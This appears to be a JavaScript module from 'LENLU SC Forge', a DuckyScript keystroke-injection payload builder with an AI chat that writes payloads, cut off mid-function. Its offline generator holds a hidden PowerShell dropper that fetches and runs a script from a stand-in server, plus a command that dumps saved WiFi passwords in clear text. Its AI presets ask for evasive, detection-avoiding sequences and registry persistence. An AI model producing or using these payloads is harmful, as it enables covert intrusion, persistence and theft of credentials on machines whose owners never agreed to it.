import { S } from './state.js';
import { toast, insertAtCursor, addLog, logFeed, copyText } from './ui.js';
import { saveHistoryToDB } from './db.js';
let tempKeys = { anthropic: '', openai: '', groq: '', custom: '' };
let lastEndpoint = 'anthropic';
    function updateEditorCounts() {
      const ed = document.getElementById('srcEditor'); if (!ed) return;
      const sl = document.getElementById('srcLines'), sc = document.getElementById('srcChars');
      if (sl) sl.textContent = ed.value.split('\n').length; if (sc) sc.textContent = ed.value.length;
      const ov = document.getElementById('outViewer')?.textContent || '';
      const ol = document.getElementById('outLines'), oc = document.getElementById('outChars');
      if (ol) ol.textContent = ov.split('\n').length; if (oc) oc.textContent = ov.length;
    }
    function exportMultilang() {
      const src = document.getElementById('srcEditor')?.value?.trim();
      if (!src) { toast('No source to export', 'warn'); return; }
      const lines = src.split('\n').filter(l => l.trim() && !l.trim().startsWith('REM'));
      let ps = '# PowerShell — LENLU SC Forge v4.0\n', ba = '#!/bin/bash\n# Bash — LENLU SC Forge v4.0\n', py = '# Python — LENLU SC Forge v4.0\nimport subprocess,time\n\n';
      lines.forEach(raw => {
        const p = raw.trim().split(/\s+/); const c = p[0].toUpperCase(); const a = p.slice(1).join(' ');
        if (c === 'DELAY') { const ms = (parseInt(a) || 0); ps += `Start-Sleep -Milliseconds ${ms}\n`; ba += `sleep ${ms / 1000}\n`; py += `time.sleep(${ms / 1000})\n`; }
        else if (c === 'STRING') { ps += `# Type: ${a}\n`; ba += `# Type: ${a}\n`; py += `# Type: ${a}\n`; }
        else if (c === 'ENTER') { ps += `# [ENTER]\n`; ba += `# [ENTER]\n`; py += `# [ENTER]\n`; }
      });
      const content = `=== POWERSHELL ===\n${ps}\n\n=== BASH ===\n${ba}\n\n=== PYTHON ===\n${py}`;
      const blob = new Blob([content], { type: 'text/plain' });
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'payload_multilang.txt'; a.click();
      toast('Multi-language export downloaded', 'ok');
    }
    function quickCompile() {
      const src = document.getElementById('qkInput')?.value?.trim();
      const log = document.getElementById('qkLog');
      if (!src) { addLog(log, 'No input', 'tl-warn'); return; }
      addLog(log, 'Compiling…', 'tl-sys');
      setTimeout(() => {
        const l = src.split('\n').filter(Boolean).length;
        addLog(log, `${l} lines → ${Math.round(l * 1.4)} instructions`, 'tl-ok');
        addLog(log, 'Stealth: ' + calcStealth(src) + '%', 'tl-info');
        S.stats.compiled++; document.getElementById('stat-compiled').textContent = S.stats.compiled;
      }, 250);
    }

    function qkAsk() {
      const q = document.getElementById('qkAskInp')?.value?.trim();
      const out = document.getElementById('qkAskOut');
      if (!q || !out) return;
      out.textContent = 'Synthesizing…';
      setTimeout(() => {
        out.innerHTML = `<span style="color:var(--g)">// OFFLINE MODE</span><br><span style="color:var(--muted)">For: "${q}"</span><br><br><span style="color:#b2ffc7">DELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER</span>`;
        S.stats.ai++; document.getElementById('stat-ai').textContent = S.stats.ai;
      }, 500);
    }
    function clearEditor() { document.getElementById('srcEditor').value = ''; document.getElementById('outViewer').textContent = '; Compiled assembly will appear here.'; updateEditorCounts(); toast('Editor cleared', 'info'); }
    function clearLog() { document.getElementById('ideLog').innerHTML = ''; }
    function copySource() { const v = document.getElementById('srcEditor')?.value; if (v) copyText(v, 'Source copied'); }
    function copyOutput() { const v = document.getElementById('outViewer')?.textContent; if (v) copyText(v, 'Assembly copied'); }
    async function pasteSource() { try { let t = ''; if (typeof Android !== 'undefined') { t = Android.readFromClipboard(); } else { t = await navigator.clipboard.readText(); } document.getElementById('srcEditor').value += t; lintSource(document.getElementById('srcEditor').value); updateEditorCounts(); toast('Pasted', 'ok'); } catch { toast('Clipboard access denied', 'err'); } }
    function exportAu3() { const v = document.getElementById('outViewer')?.textContent; if (!v || v.startsWith('; Compiled assembly will appear here')) return toast('No assembly to export', 'warn'); downloadTxt(v, 'payload.au3'); }
    function exportIDELog() { const l = document.getElementById('ideLog'); if (l) downloadTxt(l.innerText, 'ide_log.txt'); }
    function exportShellLog() { const l = document.getElementById('shellOutput'); if (l) downloadTxt(l.innerText, 'shell_log.txt'); }
    function downloadTxt(content, fn) { if (!content) return; if (typeof Android !== 'undefined') { try { Android.saveFile(fn, content); toast('Exporting ' + fn, 'ok'); return; } catch (e) { } } const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([content], { type: 'text/plain' })); a.download = fn; a.click(); toast('Downloaded ' + fn, 'ok'); }
    function importFile(input) {
      const file = input.files[0]; if (!file) return;
      const reader = new FileReader();
      reader.onload = e => { document.getElementById('srcEditor').value = e.target.result; document.getElementById('srcFileName').textContent = file.name; lintSource(e.target.result); updateEditorCounts(); toast('Imported: ' + file.name, 'ok'); };
      reader.readAsText(file); input.value = '';
    }
    function openInKeymap() { const src = document.getElementById('srcEditor')?.value; document.getElementById('keymapInput').value = src || ''; switchView('keymap', document.querySelector('[data-view=keymap]')); parseKeymapScript(); }

    async function buildEXEPackage(arch) {
      if (typeof JSZip === 'undefined') { toast('JSZip not loaded', 'err'); return; }
      const au3 = document.getElementById('outViewer')?.textContent;
      if (!au3 || au3.startsWith('; Compiled')) { toast('Compile first to build EXE package', 'warn'); return; }
      const name = document.getElementById('exeOutName')?.value || 'payload';
      const bat = `@echo off\ntitle Aut2Exe Compiler\necho Building ${name} (${arch})...\nAut2Exe.exe /in payload.au3 /out ${name}_${arch}.exe${arch === 'x64' ? ' /x64' : ''}\necho Done. Check for ${name}_${arch}.exe\npause`;
      const readme = `LENLU SC Forge v4.0 — Build Package (${arch.toUpperCase()})\n\n1. Run compile_${arch}.bat\n2. Requires AutoIt3/Aut2Exe installed\n3. Generated: ${new Date().toLocaleString()}\n4. Session: ${S.sessionId}`;
      const zip = new JSZip();
      zip.file('payload.au3', au3); zip.file(`compile_${arch}.bat`, bat); zip.file('README.txt', readme);
      const blob = await zip.generateAsync({ type: 'blob', compression: 'DEFLATE' });
      const filename = `${name}_${arch}_package.zip`;

      if (typeof Android !== 'undefined') {
        try {
          const reader = new FileReader();
          reader.onloadend = function () {
            const base64data = reader.result.split(',')[1];
            Android.saveBinaryFile(filename, base64data);
          };
          reader.readAsDataURL(blob);
          toast(`Exporting ${arch.toUpperCase()} package`, 'ok');
          addLog(document.getElementById('ideLog'), `EXE package export triggered: ${arch.toUpperCase()}`, 'tl-ok');
          return;
        } catch (e) { }
      }

      const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = filename; a.click();
      toast(`${arch.toUpperCase()} package downloaded`, 'ok');
      addLog(document.getElementById('ideLog'), `EXE package built: ${arch.toUpperCase()}`, 'tl-ok');
    }
    function loadTemplate() { renderTemplates(); openModal('modal-template'); }
    function handleTemplateFile(input) {
      const f = input.files[0]; if (!f) return;
      const reader = new FileReader();
      reader.onload = e => { parsedTemplates = parseBasicTemplates(e.target.result) || FALLBACK_TEMPLATES; renderTemplates(); toast('Loaded ' + parsedTemplates.length + ' templates', 'ok'); };
      reader.readAsText(f); input.value = '';
    }
    function parseBasicTemplates(text) {
      const out = []; const blocks = text.split(/\n(?=[A-Z][^=\n]+\n)/g);
      blocks.forEach((b, i) => { const lines = b.trim().split('\n'); if (lines.length > 1) out.push({ id: 'T_' + i, name: lines[0].trim(), code: lines.slice(1).join('\n').trim() }); });
      return out.length ? out : null;
    }
    function renderTemplates() {
      const list = document.getElementById('templateList'); if (!list) return;
      const q = document.getElementById('templateSearch')?.value?.toLowerCase() || '';
      list.innerHTML = '';
      parsedTemplates.filter(t => t.name.toLowerCase().includes(q)).forEach(t => {
        const el = document.createElement('div'); el.className = 'vault-item flex items-center justify-between';
        el.style.padding = '.65rem .9rem';
        el.innerHTML = `<div class="flex-col" style="flex:1;min-width:0"><span class="vi-name truncate" style="display:block">${t.name}</span><span class="vi-meta">${t.id}</span></div><div class="flex gap-sm"><button class="btn btn-primary btn-xs" onclick="loadTemplateById('${t.id}')">Load</button></div>`;
        list.appendChild(el);
      });
      if (!parsedTemplates.filter(t => t.name.toLowerCase().includes(q)).length) list.innerHTML = '<div class="text-muted text-xs" style="padding:.5rem">No templates match.</div>';
    }
    function loadTemplateById(id) {
      const t = parsedTemplates.find(x => x.id === id); if (!t) return;
      document.getElementById('srcEditor').value = t.code; lintSource(t.code); updateEditorCounts();
      closeModal('modal-template'); toast('Template loaded: ' + t.name, 'ok');
    }
    function insertSnippet() {
      const list = document.getElementById('snippetList'); if (!list) return;
      list.innerHTML = '';
      SNIPPETS.forEach(s => {
        const el = document.createElement('div'); el.className = 'vault-item flex items-center justify-between';
        el.style.padding = '.6rem .85rem';
        el.innerHTML = `<span class="vi-name">${s.name}</span><button class="btn btn-primary btn-xs" onclick="insertAtCursor(document.getElementById('srcEditor'),'${s.code.replace(/'/g, '\\\'').replace(/\n/g, '\\n')}');closeModal('modal-snippet')">Insert</button>`;
        list.appendChild(el);
      });
      openModal('modal-snippet');
    }
    function openModal(id) { document.getElementById(id)?.classList.add('open'); }
    function closeModal(id) { document.getElementById(id)?.classList.remove('open'); }
    function openSaveModal() { document.getElementById('modal-save').classList.add('open'); }

    function onEndpointChange(isInit) {
      const currentEndpoint = document.getElementById('aiEndpoint').value;
      if (isInit !== true) {
        tempKeys[lastEndpoint] = document.getElementById('aiKey').value;
      }
      lastEndpoint = currentEndpoint;

      document.getElementById('aiKey').value = tempKeys[currentEndpoint] || '';

      const keyInput = document.getElementById('aiKey');
      if (currentEndpoint === 'anthropic') {
        keyInput.placeholder = 'sk-ant-…';
      } else if (currentEndpoint === 'openai') {
        keyInput.placeholder = 'sk-proj-… or sk-…';
      } else if (currentEndpoint === 'groq') {
        keyInput.placeholder = 'gsk_…';
      } else {
        keyInput.placeholder = 'Custom API Key (if required)';
      }
      const customUrlGroup = document.getElementById('aiCustomEndpointGroup');
      if (customUrlGroup) {
        customUrlGroup.style.display = (currentEndpoint === 'custom') ? '' : 'none';
      }

      const helpEl = document.getElementById('aiKeyHelp');
      if (helpEl) {
        let helpHTML = '';
        if (currentEndpoint === 'anthropic') {
          helpHTML = `<strong>How to get your Anthropic key:</strong><br>
            1. Visit the <a href="https://console.anthropic.com/" target="_blank" style="color:var(--cyan);text-decoration:underline">Anthropic Console</a>.<br>
            2. Sign in or create an account, then go to **API Keys**.<br>
            3. Click **Create Key** and copy the token (starts with <code>sk-ant-</code>).<br>
            <span style="color:var(--amber)">⚠️ <strong>CORS Note:</strong> Direct browser requests are blocked by Anthropic. Install a browser extension like <em>"Allow CORS: Access-Control-Allow-Origin"</em> or configure a custom gateway to bypass it.</span>`;
        } else if (currentEndpoint === 'openai') {
          helpHTML = `<strong>How to get your OpenAI key:</strong><br>
            1. Go to the <a href="https://platform.openai.com/api-keys" target="_blank" style="color:var(--cyan);text-decoration:underline">OpenAI Keys page</a>.<br>
            2. Click **Create new secret key** and copy it (starts with <code>sk-proj-</code> or <code>sk-</code>).<br>
            <span style="color:var(--amber)">⚠️ <strong>CORS Note:</strong> Direct browser requests are blocked by OpenAI. Install a browser extension like <em>"Allow CORS: Access-Control-Allow-Origin"</em> or configure a custom gateway to bypass it.</span>`;
        } else if (currentEndpoint === 'groq') {
          helpHTML = `<strong>How to get your Groq key:</strong><br>
            1. Go to the <a href="https://console.groq.com/keys" target="_blank" style="color:var(--cyan);text-decoration:underline">Groq Console</a>.<br>
            2. Click **Create API Key** and copy it (starts with <code>gsk_</code>).<br>
            <span style="color:var(--amber)">⚠️ <strong>CORS Note:</strong> Direct browser requests are blocked by Groq. Install a browser extension like <em>"Allow CORS: Access-Control-Allow-Origin"</em> or configure a custom gateway to bypass it.</span>`;
        } else {
          helpHTML = `<strong>Connecting via Custom Gateway / Local LLM:</strong><br>
            1. Launch your local provider (e.g., <strong>Ollama</strong> or <strong>LM Studio</strong>).<br>
            2. For Ollama, launch with CORS enabled: <code>OLLAMA_ORIGINS="*" ollama serve</code>.<br>
            3. Set the endpoint URL (e.g., <code>http://localhost:11434/v1/chat/completions</code>).`;
        }
        helpEl.innerHTML = helpHTML;
      }

      if (isInit !== true) {
        const modelSelect = document.getElementById('aiModelSelect');
        if (modelSelect) {
          let defaultModel = '';
          if (currentEndpoint === 'anthropic') defaultModel = 'claude-3-5-sonnet-latest';
          else if (currentEndpoint === 'openai') defaultModel = 'gpt-4o-mini';
          else if (currentEndpoint === 'groq') defaultModel = 'llama-3.3-70b-versatile';

          if (defaultModel) {
            modelSelect.value = defaultModel;
            document.getElementById('aiModel').value = defaultModel;
          } else {
            modelSelect.value = 'custom';
          }
        }
      }
      onModelSelectChange();
    }

    function onModelSelectChange() {
      const select = document.getElementById('aiModelSelect');
      const modelInput = document.getElementById('aiModel');
      if (select && modelInput) {
        if (select.value !== 'custom') {
          modelInput.value = select.value;
          modelInput.readOnly = true;
          modelInput.style.opacity = '0.7';
        } else {
          modelInput.readOnly = false;
          modelInput.style.opacity = '1';
        }
      }
    }

    function saveAIConfig() {
      const currentEndpoint = document.getElementById('aiEndpoint')?.value || 'anthropic';
      tempKeys[currentEndpoint] = document.getElementById('aiKey')?.value || '';

      const cfg = {
        endpoint: currentEndpoint,
        keys: tempKeys,
        model: document.getElementById('aiModel')?.value || '',
        sysPrompt: document.getElementById('aiSysPrompt')?.value || '',
        delay: document.getElementById('aiDelay')?.value || '100',
        customEndpoint: document.getElementById('aiCustomEndpoint')?.value || ''
      };

      localStorage.setItem('lenlu_ai4', JSON.stringify(cfg));
      toast('Neural config saved', 'ok');
    }

    function loadAIConfig() {
      try {
        const cfg = JSON.parse(localStorage.getItem('lenlu_ai4') || '{}');
        const endpoint = cfg.endpoint || 'anthropic';
        document.getElementById('aiEndpoint').value = endpoint;
        lastEndpoint = endpoint;

        let keys = cfg.keys || { anthropic: '', openai: '', groq: '', custom: '' };
        if (cfg.key && !cfg.keys) {
          if (endpoint === 'groq' || cfg.key.startsWith('gsk_')) {
            keys.groq = cfg.key;
          } else if (endpoint === 'anthropic' || cfg.key.startsWith('sk-ant-')) {
            keys.anthropic = cfg.key;
          } else if (endpoint === 'custom') {
            keys.custom = cfg.key;
          } else {
            keys.openai = cfg.key;
          }
        }
        tempKeys = { ...keys };

        if (cfg.customEndpoint) {
          document.getElementById('aiCustomEndpoint').value = cfg.customEndpoint;
        }

        if (cfg.model) {
          document.getElementById('aiModel').value = cfg.model;
        }

        const modelSelect = document.getElementById('aiModelSelect');
        if (modelSelect) {
          const predefinedValues = [
            'claude-3-5-sonnet-latest', 'claude-3-5-haiku-latest', 'claude-3-opus-latest',
            'gpt-4o', 'gpt-4o-mini', 'o1', 'o1-mini', 'o3-mini',
            'llama-3.3-70b-versatile', 'llama-3.1-8b-instant', 'mixtral-8x7b-32768', 'gemma2-9b-it'
          ];
          if (predefinedValues.includes(cfg.model)) {
            modelSelect.value = cfg.model;
          } else {
            modelSelect.value = 'custom';
          }
        }

        if (cfg.sysPrompt) document.getElementById('aiSysPrompt').value = cfg.sysPrompt;
        if (cfg.delay) document.getElementById('aiDelay').value = cfg.delay;

        onEndpointChange(true);
        onModelSelectChange();
      } catch (e) {
        console.error('Error loading AI config:', e);
      }
    }
    const AI_TAGS = ['Open Notepad', 'Run PowerShell', 'System Recon', 'Lock Screen', 'Shutdown Timer', 'Network Info', 'DuckyScript 3.0 Function', 'WiFi Profile List'];
    function buildAITags() {
      const el = document.getElementById('aiTagGrid'); if (!el) return;
      AI_TAGS.forEach(tag => { const btn = document.createElement('button'); btn.className = 'btn btn-ghost btn-xs'; btn.textContent = tag; btn.onclick = () => document.getElementById('chatInput').value = 'Generate DuckyScript for: ' + tag; el.appendChild(btn); });
    }
    function setAIPreset(type) {
      const sysEl = document.getElementById('aiSysPrompt');
      const delayEl = document.getElementById('aiDelay');
      if (!sysEl) return;
      if (type === 'stealth') {
        sysEl.value = "You are LENLU SC, a DuckyScript compiler expert. Generate optimized, evasive keystroke sequences. Insert delays between actions to ensure host OS processes key inputs without triggering behavioral warning flags. Output only DuckyScript code.";
        if (delayEl) delayEl.value = "250";
      } else if (type === 'troll') {
        sysEl.value = "You are LENLU SC. Generate harmless, hilarious pranks and screen lock scripts. Output only valid DuckyScript with comments.";
        if (delayEl) delayEl.value = "100";
      } else if (type === 'recon') {
        sysEl.value = "You are LENLU SC. Generate network configuration, routing table, and system profile gathering DuckyScript commands. Keep it short and compact. Output only DuckyScript.";
        if (delayEl) delayEl.value = "150";
      } else if (type === 'persistence') {
        sysEl.value = "You are LENLU SC. Generate registry Run key entries or task scheduler persistence scripts using DuckyScript. Output only DuckyScript code.";
        if (delayEl) delayEl.value = "200";
      }
      toast('Preset loaded: ' + type, 'info');
    }
    async function sendChat() {
      const input = document.getElementById('chatInput'); const msg = input?.value?.trim(); if (!msg) return;
      input.value = ''; appendMsg(msg, 'user');
      S.stats.ai++; document.getElementById('stat-ai').textContent = S.stats.ai;

      const cfg = JSON.parse(localStorage.getItem('lenlu_ai4') || '{}');
      const endpoint = cfg.endpoint || 'anthropic';

      let key = '';
      if (cfg.keys && cfg.keys[endpoint]) {
        key = cfg.keys[endpoint];
      } else if (cfg.key) {
        key = cfg.key;
      }

      if (!key) {
        const prompt = msg.toLowerCase();
        let payload = 'REM Generated by LENLU SC Local Synthesizer (OFFLINE MODE)\n';
        if (prompt.includes('notepad') || prompt.includes('note') || prompt.includes('write')) {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 800\nSTRING Hello from offline Neural Synthesis!\n';
        } else if (prompt.includes('calc') || prompt.includes('calculator')) {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING calc\nENTER\n';
        } else if (prompt.includes('lock') || prompt.includes('logoff') || prompt.includes('screen')) {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING rundll32.exe user32.dll,LockWorkStation\nENTER\n';
        } else if (prompt.includes('shutdown') || prompt.includes('reboot') || prompt.includes('restart')) {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING shutdown /s /t 60\nENTER\n';
        } else if (prompt.includes('wifi') || prompt.includes('password') || prompt.includes('netsh')) {
          payload += 'REM Dump all WiFi profiles and clear keys\nDELAY 1000\nGUI r\nDELAY 300\nSTRING cmd /c netsh wlan show profiles > %TEMP%\\w.txt && for /f "tokens=2 delims=:" %a in (\'netsh wlan show profiles\') do netsh wlan show profile name="%a" key=clear >> %TEMP%\\w.txt\nENTER\n';
        } else if (prompt.includes('rickroll') || prompt.includes('troll') || prompt.includes('youtube')) {
          payload += 'REM Opening YouTube Rickroll\nDELAY 1500\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9wgXcQ\nENTER\n';
        } else if (prompt.includes('powershell') || prompt.includes('reverse shell') || prompt.includes('shell')) {
          payload += 'REM PowerShell Dropper and execution\nDELAY 1000\nGUI r\nDELAY 300\nSTRING powershell -NoP -NonI -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://yourserver.com/payload.ps1\')"\nENTER\n';
        } else if (prompt.includes('system info') || prompt.includes('recon') || prompt.includes('gathering')) {
          payload += 'REM Gathering host information\nDELAY 1000\nGUI r\nDELAY 300\nSTRING cmd /c systeminfo > %TEMP%\\sysinfo.txt && ipconfig /all >> %TEMP%\\sysinfo.txt && notepad %TEMP%\\sysinfo.txt\nENTER\n';
        } else {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 800\nSTRING LN: Unrecognized prompt. Defaulting to diagnostic text.\nSTRING Prompt was: ' + msg.replace(/\n/g, ' ') + '\nENTER\n';
        }
        appendMsg(`// OFFLINE MODE — Synthesized offline rule-based payload.\n// Objective: "${msg}"\n\n${payload}`, 'ai');
        return;
      }

      appendMsg('// Synthesizing payload…', 'ai', 'thinking');
      try {
        const sp = cfg.sysPrompt || 'You are LENLU SC, a DuckyScript assistant. Respond only with valid DuckyScript code and REM comments.';
        S.chatHistory.push({ role: 'user', content: msg });
        const headers = { 'Content-Type': 'application/json' }; let body, url, proc;

        if (endpoint === 'anthropic') {
          url = 'https://api.anthropic.com/v1/messages';
          headers['x-api-key'] = key;
          headers['anthropic-version'] = '2023-06-01';
          body = { model: cfg.model || 'claude-3-5-sonnet-latest', max_tokens: 1024, system: sp, messages: S.chatHistory };
          proc = d => d.content?.[0]?.text || 'No response';
        } else if (endpoint === 'groq') {
          url = 'https://api.groq.com/openai/v1/chat/completions';
          headers['Authorization'] = 'Bearer ' + key;
          body = { model: cfg.model || 'llama-3.3-70b-versatile', messages: [{ role: 'system', content: sp }, ...S.chatHistory] };
          proc = d => d.choices?.[0]?.message?.content || 'No response';
        } else if (endpoint === 'custom') {
          url = cfg.customEndpoint || 'http://localhost:1234/v1/chat/completions';
          headers['Authorization'] = 'Bearer ' + key;
          body = { model: cfg.model || 'custom-model', messages: [{ role: 'system', content: sp }, ...S.chatHistory] };
          proc = d => d.choices?.[0]?.message?.content || 'No response';
        } else {
          url = 'https://api.openai.com/v1/chat/completions';
          headers['Authorization'] = 'Bearer ' + key;
          body = { model: cfg.model || 'gpt-4o-mini', messages: [{ role: 'system', content: sp }, ...S.chatHistory] };
          proc = d => d.choices?.[0]?.message?.content || 'No response';
        }

        const resp = await fetch(url, { method: 'POST', headers, body: JSON.stringify(body) });
        const data = await resp.json();
        if (!resp.ok) throw new Error(data.error?.message || data.error || data.message || 'API error ' + resp.status);
        const reply = proc(data); S.chatHistory.push({ role: 'assistant', content: reply });
        removeThinkingMsg(); appendMsg(reply, 'ai');
        if (reply.includes('DELAY') || reply.includes('STRING')) { document.getElementById('srcEditor').value = reply; lintSource(reply); updateEditorCounts(); toast('AI response → compiler', 'info'); }
      } catch (e) {
        removeThinkingMsg();
        let errMsg = '// Error: ' + e.message;
        if (e.message === 'Failed to fetch' || e.message?.toLowerCase().includes('failed to fetch')) {
          errMsg += `\n//\n// 💡 Troubleshooting Connection Failure (CORS/Network):\n// - Direct browser requests to external AI APIs are blocked by browser security (CORS).\n// - FIX: Install a browser extension like "Allow CORS: Access-Control-Allow-Origin" and turn it ON, or use a custom gateway proxy.`;
        }
        appendMsg(errMsg, 'ai');
      }
    }

    function appendMsg(text, role, extra = '') {
      const c = document.getElementById('chatMessages'); if (!c) return;
      const div = document.createElement('div'); div.className = 'msg ' + role; if (extra) div.dataset.extra = extra;

      let html = `<div class="msg-bubble">${text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>')}</div>`;

      if (role === 'ai' && extra !== 'thinking') {
        html += `
          <div class="msg-actions" style="display:flex;gap:.35rem;margin-top:.42rem;margin-bottom:.42rem;">
            <button class="btn btn-ghost btn-xs btn-import"><i class="fas fa-file-import" style="margin-right:.25rem;"></i>Import to IDE</button>
            <button class="btn btn-ghost btn-xs btn-copy"><i class="fas fa-copy" style="margin-right:.25rem;"></i>Copy</button>
            <button class="btn btn-ghost btn-xs btn-download"><i class="fas fa-download" style="margin-right:.25rem;"></i>Download</button>
          </div>
        `;
      }

      html += `<div class="msg-meta">${role === 'user' ? 'YOU' : 'LENLU SC'} · ${new Date().toLocaleTimeString()}</div>`;
      div.innerHTML = html;

      if (role === 'ai' && extra !== 'thinking') {
        const importBtn = div.querySelector('.btn-import');
        if (importBtn) {
          importBtn.addEventListener('click', () => {
            document.getElementById('srcEditor').value = text.substring(text.indexOf('\n\n') + 2);
            lintSource(document.getElementById('srcEditor').value);
            updateEditorCounts();
            switchView('compiler', document.querySelector('[data-view=compiler]'));
            toast('Imported to IDE', 'ok');
          });
        }

        const copyBtn = div.querySelector('.btn-copy');
        if (copyBtn) {
          copyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(text)
              .then(() => toast('Copied to clipboard', 'ok'))
              .catch(() => toast('Copy block by browser', 'err'));
          });
        }

        const downloadBtn = div.querySelector('.btn-download');
        if (downloadBtn) {
          downloadBtn.addEventListener('click', () => {
            downloadTxt(text, 'payload.ds');
          });
        }
      }

      c.appendChild(div); c.scrollTop = c.scrollHeight;
    }

    function removeThinkingMsg() { document.getElementById('chatMessages')?.querySelector('[data-extra="thinking"]')?.remove(); }
    function clearChat() { document.getElementById('chatMessages').innerHTML = ''; S.chatHistory = []; }

    let micActive = false;
    function toggleMic() {
      const btn = document.getElementById('micBtn'); const status = document.getElementById('micStatus');
      const wave = document.getElementById('micWave');
      if (!('webkitSpeechRecognition' in window || 'SpeechRecognition' in window)) { toast('Speech recognition not supported', 'err'); return; }
      if (micActive) {
        micActive = false; S.recognition?.stop();
        btn.style.borderColor = 'var(--g)'; btn.style.background = 'var(--g-dark)';
        status.textContent = 'Click to start dictation';
        if (wave) wave.classList.remove('active');
        return;
      }
      micActive = true; btn.style.borderColor = 'var(--red)'; btn.style.background = 'rgba(255,45,85,.15)';
      status.textContent = 'Listening…';
      if (wave) wave.classList.add('active');

      const SR = window.SpeechRecognition || window.webkitSpeechRecognition; S.recognition = new SR();
      S.recognition.continuous = true; S.recognition.onresult = e => { const t = e.results[e.results.length - 1][0].transcript; document.getElementById('micOutput').textContent += t + ' '; };
      S.recognition.onend = () => {
        micActive = false; btn.style.borderColor = 'var(--g)'; btn.style.background = 'var(--g-dark)';
        status.textContent = 'Click to start dictation';
        if (wave) wave.classList.remove('active');
      };
      S.recognition.start();
    }
    function sendMicToChat() { const t = document.getElementById('micOutput')?.textContent?.trim(); if (!t) return; document.getElementById('chatInput').value = t; sendChat(); }


    function escapeAu3Text(text) { return String(text || '').replace(/"/g, '""'); }
    function normalizeDuckKey(key) { const k = String(key || '').trim().toUpperCase(); const aliases = { ESCAPE: 'ESC', CAPS: 'CAPSLOCK', CONTROL: 'CTRL', WINDOWS: 'GUI', CMD: 'GUI', COMMAND: 'GUI', OPTION: 'ALT', RETURN: 'ENTER' }; return aliases[k] || k; }
    function expandDuckySource(src) { const raw = String(src || '').replace(/\r\n?/g, '\n').split('\n'); const fns = {}, main = [], diag = []; let active = null; raw.forEach((line, idx) => { const t = line.trim(); const start = t.match(/^FUNCTION\s+([A-Za-z_$][\w$]*)\s*\(\s*\)\s*$/i); if (start) { active = { name: start[1], lines: [], line: idx + 1 }; fns[active.name.toLowerCase()] = active; return; } if (/^END_FUNCTION$/i.test(t)) { if (active) active = null; else diag.push(`Line ${idx + 1}: END_FUNCTION without FUNCTION`); return; } if (active) active.lines.push(line); else main.push(line); }); if (active) diag.push(`Line ${active.line}: FUNCTION ${active.name} missing END_FUNCTION`); const expanded = [], stack = []; const pushLines = (lines, depth = 0) => { if (depth > 12) { diag.push('Function expansion stopped: recursion limit reached'); return; } for (const line of lines) { const t = line.trim(); const call = t.match(/^([A-Za-z_$][\w$]*)\s*\(\s*\)$/); if (call && fns[call[1].toLowerCase()]) { const name = call[1].toLowerCase(); if (stack.includes(name)) { diag.push(`Recursive function skipped: ${call[1]}()`); continue; } stack.push(name); pushLines(fns[name].lines, depth + 1); stack.pop(); } else expanded.push(line); } }; pushLines(main); return { lines: expanded, diag, functions: Object.keys(fns).length }; }
    // Helper escape functions
    function escapeAu3(text) { return String(text || '').replace(/"/g, '""'); }
    function escapePs1(text) { return String(text || '').replace(/"/g, '`"').replace(/\$/g, '`$'); }
    function escapePy(text) { return String(text || '').replace(/\\/g, '\\\\').replace(/"/g, '\\"'); }
    function escapeSh(text) { return String(text || '').replace(/\\/g, '\\\\').replace(/"/g, '\\"'); }
    // Interpolation check
    function interpolate(arg, lang) {
      if (!arg.match(/\$[A-Za-z0-9_]+/)) {
        if (lang === 'au3') return `"${escapeAu3(arg)}"`;
        if (lang === 'ps1') return `"${escapePs1(arg)}"`;
        if (lang === 'py') return `"${escapePy(arg)}"`;
        return `"${escapeSh(arg)}"`;
      }
      if (lang === 'au3') {
        let res = arg.replace(/\$([A-Za-z0-9_]+)/g, '" & $$$1 & "');
        return `(${res})`.replace(/""\s*&\s*/g, '').replace(/\s*&\s*""/g, '');
      } else if (lang === 'ps1') {
        return `"${escapePs1(arg).replace(/`\$([A-Za-z0-9_]+)/g, '$$1')}"`;
      } else if (lang === 'py') {
        let res = arg.replace(/\$([A-Za-z0-9_]+)/g, '{$1}');
        return `f"${escapePy(res)}"`;
      } else {
        return `"${escapeSh(arg)}"`;
      }
    }

    function setCompilerLang(lang) {
      S.compilerLang = lang;
      document.querySelectorAll('.compiler-tab').forEach(b => {
        b.classList.toggle('active', b.getAttribute('data-lang') === lang);
      });
      const viewer = document.getElementById('outViewer');
      if (viewer) {
        viewer.textContent = S.compilerOutputs[lang] || '; No code compiled.';
        updateEditorCounts();
      }
    }
    function calcStealth(src) {
      let s = 55;
      if (src.includes('DELAY')) s += 8; if (src.match(/DELAY \d{3,}/)) s += 8;
      if (src.includes('REM')) s += 5; if (!src.toLowerCase().includes('powershell')) s += 5;
      if (src.split('\n').filter(Boolean).length > 15) s += 4; if (src.match(/DEFAULT_DELAY/i)) s += 5;
      return Math.min(s, 100);
    }

    function updateThreatMatrix(src, out) {
      const st = calcStealth(src), cx = Math.min(100, src.split('\n').length * 3), rk = 100 - st, ob = out.includes('Sleep') ? 48 : 18;
      const se = (id, v, c) => { const e = document.getElementById(id); if (e) { e.textContent = v + '%'; e.className = 'threat-val ' + c; } };
      se('dash-stealth', st, 'green'); se('dash-complexity', cx, 'amber'); se('dash-risk', rk, 'red'); se('dash-obf', ob, 'purple');
    }

    const compilePayload = function () {
      const src = document.getElementById('srcEditor')?.value?.trim();
      if (!src) { toast('No source code to compile', 'warn'); return; }
      const log = document.getElementById('ideLog');
      addLog(log, 'Compilation started...', 'tl-info');

      const expanded = expandDuckySource(src);
      const lines = expanded.lines;

      const au3 = [
        '; AutoIt3 Assembly - Generated by LENLU SC Forge v4.0',
        '; ' + new Date().toISOString(),
        '; Source: ' + String(src).split('\n').length + ' lines -> ' + lines.length + ' expanded lines',
